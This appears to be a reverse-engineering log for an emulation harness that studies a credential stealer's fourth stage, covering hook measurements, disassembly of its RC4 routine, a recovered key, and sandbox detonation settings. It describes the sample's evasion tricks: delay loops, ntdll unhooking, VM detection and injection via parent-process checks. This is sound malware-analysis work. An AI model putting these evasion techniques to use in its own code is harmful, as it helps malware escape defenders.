**A caution on all of the above.** Four harness behaviours were implemented today
— `FileNameInformation`, `CreateProcessInternalW`, `ProcessBasicInformation`,
`NtReadVirtualMemory` with host images — and **none has been checked against a
detonation**. Each is a claim about what this environment tells the payload.
They are deliberately conservative (separate PEBs, real bytes from `SysWOW64`,
out-of-image reads still failing), but conservative is a judgement, not a
measurement. The eleven-host artifact is the standing proof that a harness answer
can invent behaviour that reads convincingly as the sample's.

**What this establishes regardless:** the quiet return was **ours**, not the
sample's. A single unimplemented information class stopped a payload that
otherwise proceeds to process creation — and it was invisible for the whole
project's history because it happens past block 26,000,000, beyond where the
instruction budget had always cut the run off.

**Things that will NOT work, each disproved by measurement.** Listed because
each was a coherent story that explained every observation before it was tested:

| idea | disproof |
|---|---|
| give the DLLs real export tables | done, 10,316 names — **bit-identical run** (*0c*) |
| populate `ApiSetMap` for the forwarders | `PEB+0x30..0x3F` is **never read** (*0d*) |
| recover the RC4 key and decrypt | key recovered and confirmed — but RC4 wraps keys, not strings (*0i*) |
| ~~plant bait for it to steal~~ | **this disproof is itself retracted — see 0aa.** It rested on "asks for nothing", which was a truncated run. Stage 4 does open a file |

**Method note, earned the hard way — and note the last line especially.** Every
reading inferred from disassembly today was wrong, the matcher's arguments three
times over; every conclusion that held came from counting or hooking something
specific. **Do not check a run against a block count.** `emu_start`'s `count` is
instructions, so a fixed block total is a property of the budget, not the
program — the RUN CHECK written this morning to catch truncation ended up
certifying it. Check that **EIP has left the payload** instead.

**And a second one of the same family, found on 16 Aug.** A hook attached with
`mu.hook_add` **mid-run does not reach blocks unicorn has already translated**.
The first version of `stage4_intent.py` armed its block and memory hooks at the
`CreateProcessInternalW` event and reported **15 block entries and 68 reads
across the 2,893,593 blocks** that followed — which reads as a payload doing
almost nothing, and is a hook that only saw newly-translated code. Stopping
between `emu_start` calls is not enough on its own; `mu.ctl_flush_tb()` after
attaching is. Same failure mode as `FileNameInformation` and the RUN CHECK: the
measurement succeeded and reported nothing.

#### 0aa. CORRECTION — every 16,096,220-block figure below is a truncated run

**`emu_start`'s `count` is INSTRUCTIONS, not blocks.** A 60,000,000-instruction
budget stops this payload at 16,096,220 blocks *mid-scan*, and `Emulator.run`
reports that as `"returned or budget reached"` — a string that cannot tell a
clean return from an exhausted budget. That number was then adopted all day as
the signature of a completed run, **including as a RUN CHECK that validated
truncated runs against the truncation itself**. The guard introduced to catch
this failure encoded it instead.

The real run, at a 400,000,000-instruction budget:

| | truncated (60M) | actual (400M) |
|---|---|---|
| blocks | 16,096,220 | **42,072,701** |
| distinct blocks | 403 | **592** |
| payload pages | 22 | **24 of 67** |
| ends at | mid-scan, in the payload | `eip 0x7700a007` — resume address +0x17 |

**The fixed check is EIP-based**: the trampoline returns to `0x77009ff0`, so EIP
still inside the payload means the budget ran out. `stage4_declined.py` and
`stage4_asks.py` now test that and exit 2 rather than reporting.

**What this overturns:**

- **"Stage 4 asks the OS for nothing" — RETRACTED.** At full budget it calls
  `RtlGetProcessHeaps`, `RtlDosPathNameToNtPathName_U`, **`NtCreateFile`**,
  `NtQueryInformationFile`, `NtClose`, `RtlAllocateHeap` and `RtlFreeHeap` ×2.
- **It opens `\??\ntdll.dll`** at block 26,917,406, then queries file
  information at 35,896,179. **That is the ntdll unhooking check** — reading a
  clean copy from disk to compare against the loaded one, the same move stage 3
  makes and the exact behaviour `dynamic_analysis/ntdll_unhooking.py` exists to
  catch.
- **"Bait is not the lever" — retracted with it.** Stage 4 does open a file. It
  is not a credential store, but the reasoning that killed the idea was built on
  a run cut off before the file access.

**What survives the correction:** it still returns without unpacking (the 400M
run reaches the trampoline's return and faults in ntdll beyond it), and nothing
still branches into the unexecuted pages — though **indirect call sites went
from 1 to 9** (`call ecx` ×3, `call [ebp+0x1f]` ×2, `call edx` ×2, `call eax`
×2), and those have no static target, so "nothing reaches them" is weaker than
stated below.

**The 60M measurements, rerun at 400M:**

| measurement | truncated | full run | conclusion |
|---|---|---|---|
| matcher calls | 990,570 | **1,127,165** | holds — 1,127,160 of them still the self-location needle |
| distinct needles | 1 | **4** | the 3 extra are 5 calls total; noise |
| RC4 keystream | 1,665 B | **4,440 B** | **holds** — still far too little for a string table, so RC4 wraps keys |
| hot code pages | 23 | **32** | more of the stub runs than was visible |
| stack writes | 9,579,557 | **14,744,256** | — |
| payload write spans | 2 × 6 B | **6 × 6 B**, 21,028 writes | small fixed patches, not an unpack |
| payload bytes changed | 249 | **0 of 273,408** | **stronger than before** — see below |
| the two 64 KB wipes | 16,384 each | **16,384 each** | unchanged — a fixed-size cleanup, not proportional to runtime |
| IOC strings found | none | **none by the payload** | **holds**, see below |

**The string sweep needs a caveat I introduced myself.** It now reports 39 hits
against 9, but every one is inside a DLL image: `ProgramFiles` ×10, `SysWOW64`
×5, `Program Files` ×5, `windir` ×4, `\explorer.exe`, and a `gzip, deflate, br`
at `0x216b8faa` — which is **urlmon's own `Accept-Encoding` literal**, not the
payload's. The rise from 9 to 39 is entirely the 20 real DLLs mapped in *0c*
putting more Windows strings in the address space. **Mapping real exports made
this sweep noisier**; judge it by which region a hit lands in, not by the count.

**Stage 4 leaves its own image byte-for-byte unchanged.** The full run reports
`bytes changed in the payload: 0 of 273,408`, with entropy, non-zero fraction and
`MZ`/`PE` counts identical before and after (7.705, 96.09%, 7 and 5). It makes
**21,028 writes** into six 6-byte spans and every one is back to its original
value by the end.

That is a *stronger* result than the 249 it replaces, and it settles the
packed-body question: the 249 was a mid-patch snapshot caught at the truncation
point, not a residue of partial unpacking. **Stage 4 does not modify itself at
all.** Whatever those six spans are, they are scratch — written, used, restored.

#### 0ab. The ntdll-patch hypothesis is DEAD, and the real second half appears

**Tested, cheaply, before building anything.** The only bytes this harness writes
inside ntdll's image are 4 at `ntdll_base + transition_rva` — the
`Wow64Transition` slot, at `0x7713b014`. Hooking payload reads of the loaded
ntdll after block 26,000,000:

    payload reads of the loaded ntdll image: 124,453 over 13 pages
    reads of the Wow64Transition slot:       0

**Zero.** The patched range is never read, so it cannot be what makes stage 4
leave. Hypothesis dead for the cost of one hook. (It was weak anyway: the kernel
fills that slot at load on real Windows too, and it is zero in the file on disk
either way, so a loaded-vs-disk comparison flags it on a real machine as well.)

**But the reads themselves are the find.** They cluster at ntdll RVA
`0x126000`–`0x12b000`, which is **inside ntdll's export directory**
(`0x11fd60`–`0x133695`), in the export *name strings* — with page `0x122000`,
`AddressOfNames`, read 2,340 times. Two instructions drive it, payload
`+0x2ca71` and `+0x2d155`, 58,115 times each.

**So stage 4 resolves imports against ntdll's 2,517 export names, and this
project has never seen it** — it happens past block 26,000,000, and every run
before this was truncated at 16,096,220.

**Both readings of the earlier loop stand.** The 990,570 comparisons at 14–16M
blocks really are a self-location scan (*0l*). This is a *different, later* loop.
The retraction in *0l* was right about what it retracted and wrong as a blanket
claim that stage 4 does no import resolution.

**Where that leaves THE QUESTION.** Import-resolution failure is live again as
an explanation, but now it has to be measured at full budget rather than
inferred — the same mistake is available in the new region. The next probe is
whether those resolutions *succeed*: log what `+0x2ca71` compares and what the
lookup returns, with the EIP-based run check in place.

#### 0a. RETRACTED by 0aa: stage 4 asks for nothing, so bait is not the lever

`scripts/stage4_asks.py` logs stage 4's own requests, with the loader's calls
subtracted. Across **16,096,220 blocks it makes one API call** —
`RtlGetProcessHeaps` — opens no file, reads no key, passes no name to anything,
and never calls `RtlAllocateHeap` afterwards. **Nothing on disk can be found by
something that never asks for a path**, so the fixture cannot be a credential
file.

What it does instead: **14M of those 16M blocks are inside two pages**,
`0x3ec0000` (7.24M) and `0x3ea8000` (6.76M), with 9.58M writes to the stack and
only 249 of 273,408 payload bytes changed. A tight compute loop that terminates
on its own — the same shape as stage 3's 512-million-iteration stall.

**Retracted before it misleads anyone:** the call is reached through `call [edi]`
and `push <const> / push <n> / call 0x3e95214` sits nearby, which was read here
as hash-based import resolution. It is not. Probed, `0x3e95214` is called three
times and returns `0xb4e1ae2`, `0xbf0a5e41`, `0x7544791c` — none of them mapped
addresses, so it derives values rather than resolving imports.

**So the next question is what those two pages compute and what makes the
payload return**, not what to put on disk. A fixture only becomes meaningful
once something asks for one.

#### 0b. TRACED — stage 4 is resolving imports, and 999,994 in a million fail

`scripts/trace_stage4_loop.py` counts every basic block in the two hot pages.
92 distinct blocks, 14,007,772 entries, and both routines are recognisable:

- **`0x3ea8000` is CRC-32.** `add eax,eax / xor eax,0x4c11db7` — the standard
  polynomial, bitwise MSB-first, 8 iterations a byte, 2,243,584 inner passes.
- **`0x3ec0000` is a case-folding name walker** (`cmp al,0x41` skipping the fold
  below `'A'`), entered **990,570 times**.

**990,564 of those exit through `xor eax,eax / ret` — no match.** Six succeed in
a million attempts, and exactly one became an API call. Against the host's real
export tables, 1,665 in kernel32 and 2,517 in ntdll, 990,570 hashes is about
**237 full walks of both directories**: stage 4 is trying to resolve roughly 237
imports and getting almost none.

**The cause is a harness gap, and this file already argued the principle.**
`setup()` maps real exports for exactly two DLLs:

    for base, nm in ((KERNEL32_BASE, "KERNEL32.DLL"), (NTDLL_BASE, "ntdll.dll")):
        exports, size = map_real_dll(...)

`EXTRA_MODULES` lists the whole stealer toolkit — `advapi32`, `crypt32`,
`wininet`, `ws2_32`, `shell32`, `shlwapi`, `ole32`, `urlmon` — but they are
built as *"a DOS/PE header only … without pretending to export anything."* So
stage 4 sees `crypt32.dll` in the loader list, walks it for
`CryptUnprotectData`, and finds an empty header. `CryptUnprotectData` is how
Chrome and IE credentials are decrypted; the HTTP stack behind the Nokia user
agent is in `wininet`. **None of it is reachable.**

The note above `EXTRA_MODULES` makes the case itself — *"A short module list is
a divergence, not a simplification"* — after a run burned 2.3 billion
instructions hashing three names. The list was lengthened then. The exports
were not.

**This explains every open observation at once:** 44 of 67 pages never running,
no file ever opened, the IOC strings never built, and bait being unreachable.
All of it sits behind resolutions that cannot succeed in an address space
missing the libraries.

**The fixture is the missing exports, not a credential file** — and note this is
a *fidelity* fix rather than a fed answer. A real hollowed `RegSvcs.exe` has
these modules loaded with real export directories; serving them claims nothing
about the machine that is not true of every 32-bit Windows process. That is the
distinction between this and bait, and it is why this one does not need to be
off by default the way `RINGFORGE_EXPLORER_CHILD` does.

#### 0c. DONE, and the hypothesis is WRONG — 16 Aug

`winenv.map_extra_module_exports()` now gives all 20 `EXTRA_MODULES` real export
tables from `SysWOW64` — 24.1 MB, **10,316 exported names** — packed in their own
region at `REAL_MODULE_BASE` (`0x20000000`) with each loader entry's `DllBase`
and `SizeOfImage` repointed. It runs from `setup()` *and* from `restore()`,
because the stored checkpoints are what stage 4 is actually run from and a
fresh-runs-only fix would never reach it. `_install_hooks` covers the new region,
without which a resolved export would execute the DLL's real body — a worse
failure than the empty headers, because it looks like it is working.

**And stage 4 did not change.** Same one API call, and **16,096,220 blocks —
bit-identical to the run before**. A search space gaining 10,316 resolvable
names would move the block count if it were being walked. It was not touched.

**So the empty export tables were a real divergence and are not the gate.** The
~237 walks are of `kernel32` and `ntdll` only, stage 4 never calls
`LoadLibrary`, and it therefore never reaches for `crypt32` or `wininet` on this
path at all. Whatever decides it has nothing to do is upstream of import
resolution, not caused by it.

The change is kept regardless: this file already argues that a short module list
is a divergence, and a module list whose entries export nothing is the same
claim in a different place. But **it bought no progress on stage 4**, and the
next person should not re-run it expecting any.

#### 0d. THE LEAD: stage 4 tests for `API-`, and the PEB has no ApiSetMap

Chasing the matcher's accepted names failed three times — the arguments are not
the `(begin, end)` pair the disassembly suggests, `0x3ec0005` is not its result
check despite matching call counts, and "990,564 failures, 6 successes" was an
*inference* from block counts rather than a measurement. **Do not build on that
framing.** What is measured is 990,570 entries and 990,564 exits through
`xor eax,eax / ret`.

Counting rarely-entered blocks instead found the only low-count code in the
page: an ASCII→UTF-16 widening routine, entered exactly twice. Hooking it gives
the two strings stage 4 builds on this whole path:

    [14,000,244blk]  'kernel32.dll'
    [15,695,162blk]  'API-'

**`API-` is the API set prefix** — `api-ms-win-core-*`. Stage 4 resolves an
export, finds a **forwarder**, and tests whether the target is an API set before
following it. Measured on this host: `kernel32` has 1,665 exports, **208 of them
forwarders, 82 forwarding to API sets** (`AddDllDirectory ->
api-ms-win-core-libraryloader-l1-1-0.AddDllDirectory`).

**And `ApiSetMap` is never written.** Nothing in `win32_emu_env.py` sets the PEB
field, so it reads zero. A payload doing its own forwarder resolution has
nowhere to go.

This fits everything the DLL-mapping experiment did not: presence of an export
table was never the problem, **resolvability through forwarders is**. It also
explains why adding 10,316 names changed nothing bit-for-bit — the walk dies at
the same forwarder either way.

**Tested before building anything: stage 4 never reads `ApiSetMap`.** A memory
hook over `PEB+0x30..0x3F` across the whole run fires **zero** times. So
populating the schema cannot change behaviour, and it was not built.

**That reinterprets the string.** Stage 4 *detects* API-set forwarders rather
than resolving them — it tests the `API-` prefix and does something else with
those exports, almost certainly declining to follow them. Which is why neither
real export tables nor a schema moves it.

#### 0e. Two coherent hypotheses, both falsified, and what that is worth

| hypothesis | test | result |
|---|---|---|
| header-only export tables gate the harvesting | mapped 20 real DLLs, 10,316 names | **bit-identical run**, 16,096,220 blocks |
| unresolvable API-set forwarders gate it | hooked `PEB+0x30..0x3F` | **never read** |

Both explained every observation before they were tested. The first cost a full
implementation to disprove; the second cost one hook, because the lesson from the
first was applied. **Probe before building** — the DLL mapping is kept for
fidelity, but it bought nothing, and the schema would have bought nothing at
greater expense.

What is now excluded: export *presence*, and API-set resolution.

#### 0f. Read forwards from the widening: two identical passes, all ciphertext

Reading forwards from the `kernel32.dll` widening rather than guessing at
arguments — which is the method that has worked every time today — leads
straight into stack-buffer construction:

    mov  esi, [ebp+8]
    push 5
    push esi
    mov  dword ptr [ebp-8], 0xd45cb4b4    ; a 4-byte obfuscated constant
    mov  word  ptr [ebp-4], 0             ; NUL
    call 0x3ec0504                        ; fill
    ...
    push 4 / lea eax,[ebp-8] / push eax / push esi
    call 0x3ec04d4                        ; byte copy

That is the shape FLOSS's stack-strings pass reconstructs. Hooking the copy
routine `0x3ec04d4` (cdecl `(dst, src, len)`) across the window gives **nine
copies and not one byte of plaintext**:

| block | dst | len | bytes |
|---|---|---|---|
| 14,000,142 | `0x03e9bcd6` **in the payload** | 6 | `77 bd 3f ab c3 d5` |
| 14,000,151 | `0x03e9bb7f` **in the payload** | 6 | `1c f7 ae 23 a6 67` |
| 14,000,338 | stack | 4 | `b4 b4 5c d4` |
| 14,000,368 | stack | 20 | `72 2a b6 6c …` |
| 15,695,138 | `0x03e9bcd6` | 6 | `77 bd 3f ab c3 d5` — identical |
| 15,695,147 | `0x03e9bb7f` | 6 | `1c f7 ae 23 a6 67` — identical |
| 15,695,225 | stack | 4 | `71 b6 9c 19` — the one thing that differs |
| 15,695,255 | stack | 20 | `72 2a b6 6c …` — identical |

**Two near-identical passes 1.7M blocks apart**, the `kernel32.dll` widening in
the first and `API-` in the second, moving the same encrypted material both
times. The two payload destinations at `+0x8062` and `+0x7f0b` are 6-byte writes
into its own image, which is consistent with `--survey` reporting 7,941 payload
writes confined to two 6-byte spans.

**So this path produces no plaintext at all.** It shuffles ciphertext and patches
six bytes of itself, twice. That is the same conclusion the page count reached
from the other direction — the decoders that produce readable strings are in the
44 of 67 pages that never execute — and it is now shown at the instruction level
rather than inferred from an absence.

#### 0g. STAGE 4'S CIPHER IS RC4 — 16 Aug

Watching what reads those two constants found the decryptor. At payload
**`+0x42d3`** (`0x03e97f47`):

    mov   ecx, [eax+0x34]          ; state base
    movzx edx, byte [eax+0x90]     ; j
    movzx edx, byte [edx+ecx]      ; S[j]
    movzx esi, byte [eax+0x30]     ; i
    add   dl,  byte [esi+ecx]      ; S[i] + S[j]
    movzx ecx, byte [edx+ecx]      ; S[(S[i]+S[j]) & 0xff]
    mov   [eax+0x8c], ecx          ; keystream byte

**Verified rather than pattern-matched.** Dumping the 256 bytes at `[eax+0x34]`
gives **256 distinct values, a permutation of 0..255**, and three consecutive
samples show it mutating one byte at a time — the PRGA swap:

    offset 2:  5a -> c3 -> c3
    offset 3:  4a -> 4a -> ab

Context layout: `i` at `[eax+0x30]`, `j` at `[eax+0x90]`, state pointer at
`[eax+0x34]`, keystream byte cached at `[eax+0x8c]`. It runs at **block
1,710,037**, early — not in the 14M/15.7M passes.

**Retracting the line this section previously ended on.** It said the two 4-byte
constants were "the only per-pass-varying material and therefore the most likely
key or selector". They are neither: the RC4 state pointer is `0x1007f7ea`, inside
the very window being watched, so `0xd45cb4b4` and `0x71b69c19` were **S-box
bytes in a reused stack region**. They vary because the permutation mutates.

**Plaintext is still not located.** Scans of the payload image and the stack
found no new ASCII: 249 payload bytes change across the whole run (agreeing with
`--survey`), and none of it is readable. One stack string appeared,
`wnlsmbcodepagetag`, which reads as NLS codepage machinery rather than an
indicator.

**And that scan is not trustworthy on timing** — it used chunked `resume()` and
truncated, reporting 366,833 / 3,388,869 / 6,960,495 instead of the requested
checkpoints. That is the trap documented under *And running it further does not
reach them* above, walked into again by the
person who documented it. **Any probe that calls `resume()` more than once must
have its block total checked against 16,096,220 before its output means
anything.**

#### 0h. THE KSA AND A 20-BYTE KEY — 16 Aug

**KSA at payload `+0x419b`** (`0x03e97e0f`). Found by the identity fill, which is
unambiguous and needed no disassembly reading:

    [1,709,519blk] S[  0] = 0x00  by 0x03e97e0f
    [1,709,520blk] S[  1] = 0x01  by 0x03e97e0f
    [1,709,521blk] S[  2] = 0x02  by 0x03e97e0f   ... 256 of them

518 blocks before the PRGA at `+0x42d3`.

**The key is 20 bytes at `0x1007fdf0`, read by `0x03e97e23`:**

    48 4d c8 73 10 a6 96 f2 a9 38 f8 2f dd eb 90 15 79 ba 3b a5

Isolated by byte-sized reads only, grouped into consecutive runs — dword loop
variables are excluded by size and scattered frame access cannot form a run.
Each of the 20 bytes was read **12–14 times**, and 20 × 13 = 260 ≈ the 256 KSA
iterations that cycle `key[i mod keylen]`. Two shorter runs also appeared, 6
bytes at `0x1007fe4c` and 4 at `0x1007fe2d`, read far fewer times.

**What is NOT established: what it decrypts.** RC4-ing the captured ciphertext
blobs with this key from keystream position 0 produces no plaintext. That is
unsurprising rather than contradictory — those blobs were copied at blocks
14,000,142 and later, **12 million blocks after** this instance was keyed, so
they are near-certainly a different context or a different keystream offset.
**The key is well-evidenced as what this KSA consumed, and nothing more.**

#### 0i. Key confirmed; RC4 wraps keys here, it does not decrypt strings

Hooking the PRGA store (`mov [eax+0x8c], ecx` at `0x03e97f5c`) and clustering
byte writes settles both questions.

**The key is confirmed by its expansion buffer.** A 260-byte run at
`0x1007f5ec` holds the 20 bytes tiled:

    48 4d c8 73 | 48 4d c8 73 10 a6 96 f2 a9 38 f8 2f dd eb 90 15 79 ba 3b a5 | 48 4d c8 73 …

That is the KSA's `key[i mod 20]`, so the key is established by demonstration
rather than by read-count inference.

**But RC4 is not the string decryptor.** Across the entire 16,096,220-block run
it emits **1,665 keystream bytes**, and the first 18 are `00 25 4c 55 14 59`
**repeated three times** — it is re-keyed three times with the same key, six
bytes each. Six- and twenty-byte quantities are tokens, not text. A stealer's
string table would need orders of magnitude more keystream.

**There is a second key, and the blobs are key material.** The slot at
`0x1007fdf0` later holds
`dc 3d 73 b1 84 d6 2d 30 3d 48 43 ed 49 9b 2b d7 ed ca 80 67`, which is
byte-for-byte the 20-byte blob copied at block 15,452,101. So the copies traced
in *0f* are keys moving between slots, not encrypted strings — which is why
decrypting them as ciphertext produced nothing.

**Net:** RC4 here is key wrapping. The string decoders are still in the 44 of 67
pages that never execute, and this closes the loop from a third direction —
after the page count and the instruction-level trace, the cipher census now says
the same thing. **No plaintext was produced, and none should have been expected
from this routine.**

#### 0j. NOTHING calls into the unexecuted pages — they are not code yet

`scripts/stage4_declined.py` records every executed basic block, then asks a
mechanical question of each: of this branch's two successors, was exactly one
ever taken, and does the untaken side land in a page that never ran? No
disassembly intent is inferred, which is the method that has failed repeatedly
on this payload.

    RUN CHECK: 16,096,220 blocks
    403 distinct block(s) executed, 22 of 67 pages
    0 branch(es)/call(s) whose untaken side is in a page that never ran
    indirect call sites in executed code: 1   (call eax)

**Zero.** Not a declined conditional, not a direct call, and one solitary
indirect call site in the whole of stage 4's executed code. **There is no gate
being declined**: the executed code contains no reference to those pages at all.

And **403 distinct basic blocks** across 16 million entries — a very small stub
running extremely tight loops.

**So the framing this file has used all day is wrong, and is retracted.** "44 of
67 pages never execute, the credential harvesting is in there" implied unreached
*code* behind a decision. It is not. Nothing branches there because **those pages
are not code yet** — they are stage 4's still-packed body, which is exactly what
the artifact README says of the image: *"plaintext code pages surrounded by data
that stays packed"*.

**This explains every negative result of the day at once.** No bait could be
found, no export table helped, no API set schema mattered, and the recovered RC4
key unlocked nothing, because **stage 4 never unpacked its own body in this
run**. It executes an initialisation stub, hashes ~990,000 names, wraps a few
keys, writes 249 bytes, and returns. The stealer was never there to be reached.

**That is the question for whoever picks this up:** not what gates the
harvesting, but **what would make stage 4 unpack itself**.

#### 0k. The 403 blocks, read end to end

403 blocks, 57 call targets, 96 executed exactly once. Dumped in first-seen order
with counts. What the executed stub does, start to finish:

1. **Trampoline** — `push 0x77009ff0 / pushal / call 0x3e9f0c4`. Note the resume
   address: the run's terminal fault at `0x7700a007` is that value **+0x17**,
   which independently confirms the payload returned cleanly and then ran off
   into ntdll data on a fabricated stack. Not a crash in stage 4.
2. **Three do-nothing accumulator loops** — 1,842, 3,616 and 1,806 iterations
   against bounds `0x1cc5` and `0x1c3d`, one with an `and eax, 0x80000001`
   parity test. They compute nothing that is used. Anti-analysis delay, the same
   family habit as stage 3's 512-million-iteration stall.
3. **`mov byte ptr [ebp-0x119], 0x1d`** — the handshake flag, matching what this
   file already records about the loader writing `0x1d`.
4. **Builds a `UNICODE_STRING` for `kernel32.dll`** at ~block 14,000,164, off the
   context cookie: `mov ebx,[esi+0x6d8]` / `lea eax,[esi+0x780]`, a `0x104`
   (MAX_PATH) buffer, the ASCII→UTF-16 widener at `0x3ec0bb4`, then
   `mov word [edi+2],bx` / `mov word [edi],dx` — `{Length, MaximumLength}`.
   **This is a manual `GetModuleHandle` against the PEB loader list**, which is
   why the widening appears there.
5. **Scans memory backwards for its own image header** — 990,570 comparisons,
   see below. **Not** an export walk; that reading is retracted.
6. **Returns**, without unpacking its body.

**The matcher, read correctly at last.** Three earlier attempts had its arguments
wrong; the call site settles it:

    push 0x14                ; arg3 = 20, the LENGTH
    push edx                 ; arg2 = second string
    push esi                 ; arg1 = first string
    call 0x3ec0714
    ...
    mov  esi, [ebp+0xc] ; sub esi, ecx    <- a BASE DELTA, not a length
    cmp  al, 0x41 / 0x7a                  <- case fold
    cmp  al, [esi+ecx]                    <- compare

It is `strncasecmp(str1, str2, 20)`. The `sub esi, ecx` that was repeatedly
misread as a length is the delta that makes `[esi+ecx]` index the second string.
**20 characters** is the comparison width throughout.

**Nothing in the stub decrypts, allocates a payload region, or transfers control
into the packed pages.**

#### 0l. The 990,570 comparisons are a self-location scan, not an export walk

Logging the matcher's arguments — finally possible once its signature was read
correctly — settles what the loop is for. **One distinct needle, for all
990,570 comparisons:**

    8c 47 f9 0f 5e 7d 3c 70 ed bb 6b 2d fa 8c f4 d1 08 f6 82 76

Those are **the payload's own first 20 bytes**, byte-for-byte the content at
`0x3e93c74`. The candidates are one-byte-shifted sliding windows —
`00 58 c3 e8 …`, then `00 00 58 c3 e8 …`, then `00 00 00 58 c3 e8 …` — which is
the caller's `dec esi` walking *backwards* through memory a byte at a time.

**So stage 4 is scanning memory backwards looking for itself.** Self-locating
code finding its own mapped base, ~990 KB of scan, and it succeeds: the handful
of accepted comparisons all report `arg1 = 0x03e93c74`, the payload base.

**Three readings of this loop are now retracted**, all of them inferences from
disassembly rather than measurements:

1. "990,564 failures, 6 successes" — a guess from block counts.
2. "~237 walks of kernel32's and ntdll's 4,182 exports" — the arithmetic was a
   coincidence. This is why mapping 10,316 real export names changed nothing
   (*0c*): the loop never looked at an export table.
3. "hash-based import resolution" — `0x3e95214` derives values; this scans bytes.

**What it means for THE QUESTION.** The scan *works*. Stage 4 locates its own
image and then returns anyway, so self-location is not the blocker either. The
decision to leave is downstream of a successful scan, which narrows where in the
403 blocks to look — but note this loop consumes ~14M of the 16M blocks, so
whatever follows it is a small tail of code, and that tail is where the answer
is.

**Two probes failed first, both instructive.** Hooking the state address over the
whole run filled a 4,000-entry cap by block 261,438 with ordinary stack-frame
churn — pushed pointers like `0x3ec0005`, not S-box bytes — because that stack
range is reused. Adding a block window and a `size == 1` filter fixed it. And
every probe from here carries the `RUN CHECK` line: this one reported
**16,096,220 blocks**, so it did not truncate.

#### 0m. The fixture rules, kept for whenever a fixture is finally warranted

This began as *"stage 4 has nothing to steal, so give it something"*. **The
premise is retracted** — it asks the OS for nothing (*0a*) and never unpacks the
code that would (*0j*), so no bait is reachable. What survives is the discipline,
which applies to any future fixture:

1. **First find out what is asked for.** Log the payload's own calls and every
   path, key and name it queries, with the loader's subtracted. If nothing is
   asked, a fixture cannot answer.
2. **Then build one that answers what was asked**, not what the FLOSS strings
   suggest. Those came from decoders emulated in isolation and do not prove the
   payload ever requests those paths on any path it actually runs.
3. **Off by default, announced when on**, exactly as `RINGFORGE_EXPLORER_CHILD`
   is — serving a target manufactures the outcome, and every conclusion from
   such a run is conditional on the fixture.

Getting this wrong produces a run that looks like a stealer stealing and is
really a harness feeding itself. Note the contrast with the real-export mapping
in *0c*, which needed no opt-in: giving loaded modules their true export tables
claims nothing about the machine that is not true of every 32-bit process, where
inventing a browser profile would.

#### 1. Do not book another detonation for gap 4b — a different sample will not fix it

This was tried, on 13 Aug, and it is now settled with two data points rather
than one. Run `bb51babb` (FormBook) collected 73,825 registry reads and named no
VM artifact. Run `8f4ca91…` used a sample **picked for this behaviour**, which
then put *"cannot run inside a virtual machine"* on screen and still produced
`artifacts_read: 0` — a false negative against a known positive, with the
registry, file, device-namespace and WMI routes all individually ruled out.

**Two for two, on samples that demonstrably detect virtualisation.** The
registry is a narrow surface and the field does not favour it. Gap 4b's finding
path is not waiting on a better sample; it is waiting on an input that is rarer
than this document assumed. **Record gap 4 as context-only by decision and stop
booking runs at it** — see *Run `8f4ca91…`*. Aiming the threshold now needs a
sample confirmed by reading its code, not by a sandbox signature.

The run settings, kept here only because they are measured and a future
detonation of *some* sample will want them:

| setting | value | why |
|---|---|---|
| Procmon config | `dynamic_registry_reads.pmc` | now the default; confirm `config.json` has not pinned the old one |
| Offsets | `1, 25, 55` | dormancy has been +20s to +60s; `1, 25` risks landing entirely before the unpack |
| Max processes | `24` | the cap counts dumps, and re-dumps are taken last |
| Re-dump | `1`s | but see below — the event triggers are what actually caught `RegSvcs` |

**There is no profile control in the GUI, and this table used to claim one.**
`run_profile` is an orchestrator config key (`quick`/`standard`/`deep`,
defaulting to `standard`), reachable only by calling the orchestrator
programmatically — no widget in `gui/`, nothing in `scripts/` that sets it. It
changed two things, and neither survives contact with this table: the default
dump offsets, which an explicit `1, 25, 55` overrides anyway, and
`autoruns_deep_scan`, which feeds persistence diffing rather than the memory
path. **Set the offsets and ignore the profile.** The row read `deep — longer
window`, which is also wrong about what it did.

And the three that are not settings: **`git pull` on the guest after the
revert** (reverting restores the clone to the baseline's commit, so pulling
first throws it away); **export before the next revert**, because `cases\` is
destroyed and `C:\werdumps` survives losing `cases\` but not a revert;
and run `scripts/verify_run.py <run-dir>` afterwards, which checks all twelve
ledger rows and the pre-registered predictions in one command.

**A `git pull` does not put a new local YARA rule into the scan.** The scanned
directory is `tools\yara\rules\`; hand-written rules live in `tools\yara\local\`,
and it is `bootstrap_yara_rules.ps1` that copies them into
`tools\yara\rules\local\`. Collection is recursive, so once a file is there it is
picked up — but a pull alone leaves it one directory away from anything that
reads it, and the run then reports nothing, which is indistinguishable from the
rule being wrong. Either re-run the bootstrap (needs the guest armed, and it
only installs local rules on a successful download-and-swap) or copy the one
file:

    Copy-Item tools\yara\local\<rule>.yar tools\yara\rules\local\ -Force

The preflight strip's rule-file count is the check that it landed.

**The dump watcher can catch `RegSvcs` after all** — this document said for two
runs that it could not. It did on `bb51babb`, twice, via the `process-spawn` and
`process-exit` triggers. Those are event-driven and do not care that the process
lives 3 seconds; only the *scheduled* offsets do. The WER crash dump is no
longer the only route to a `RegSvcs` image.

#### 2. The sample, which is where the actual goal has always been

> **STALE AT THE TOP, still useful below.** "Stage 4 is unrecovered" was true
> when this was written and false since 16 Aug — see *Stage 4 is recovered*,
> which has it decrypted, sized, and identified as a credential stealer with
> IOCs. The bullets under here are still the working list; the framing sentence
> is not. Read `Pick up here — 17 Aug` for current state.

Stage 4 is unrecovered and the emulator reaches a clean `ExitProcess` without
crashing, so the crash was never what stood between us and it — the poll loop
is. **This is the main line now, and it is emulator work rather than VM work.**

**Start with the poll loop, because it is what actually ends the emulated run.**
The sample genuinely runs out of things to do: it polls seven times, finds
nothing, and returns cleanly. `NtWriteVirtualMemory` is never called, no process
is opened, and the injection instrumentation sits in place and idle.

**And the seven passes are two alternating shapes, not one repeated** — see
*The poll loop is not seven identical sweeps*. The pass immediately before
`ExitProcess` never consults the blocklist at all, so the decision to leave is
made somewhere nobody has looked. **That reorders what follows:** the quiet
pass is now the first question, and the uncracked names are the second, because
they are consumed by the pass that is *not* making the decision.

- **Done, and it paid out.** The quiet pass compares each record's *parent pid*
  against an array holding one value — `explorer.exe`'s. Serving one child of
  explorer took the emulator through a complete section-mapping injection that
  no run had ever reached. See *Serving one child of explorer reached the
  injection*.
- **Also done.** `[edi+0x250]` is 273,408 bytes, and the buffer at `0x27e7000`
  holding exactly that much is confirmed as the injection source — read once per
  byte in a pass ending 645 blocks before `NtClose` on the section.
- **The transform was a dead end, and that is settled.** Source and destination
  are both ciphertext, their XOR is entropy 7.999 with no period, so there is
  nothing to solve offline. **The route is to run the injected thread**, which
